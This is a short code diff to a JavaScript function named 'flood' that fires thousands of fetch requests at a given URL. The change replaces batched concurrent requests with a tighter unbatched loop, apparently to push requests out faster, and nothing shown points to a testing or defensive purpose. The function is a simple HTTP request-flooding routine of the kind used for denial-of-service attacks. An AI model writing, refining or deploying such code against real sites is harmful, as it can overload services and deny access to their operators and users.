@@ -5,15 +5,12 @@ async function flood(url, count = 3000) {
   const controller = new AbortController();
   currentController = controller;
 
-  const batch = 100;
-  for (let i = 0; i < count && !controller.signal.aborted; i += batch) {
-    const promises = [];
-    for (let j = 0; j < batch; j++) {
-      promises.push(
-        fetch(url, { mode: 'no-cors', signal: controller.signal }).catch(() => {})
-      );
+  for (let i = 0; i < count && !controller.signal.aborted; i++) {
+    fetch(url, { keepalive: false, signal: controller.signal })
+      .catch(() => {});
+    if (i % 100 === 0) {
+      await new Promise(r => setImmediate(r));
     }
-    await Promise.all(promises);
   }
   currentController = null;
 }
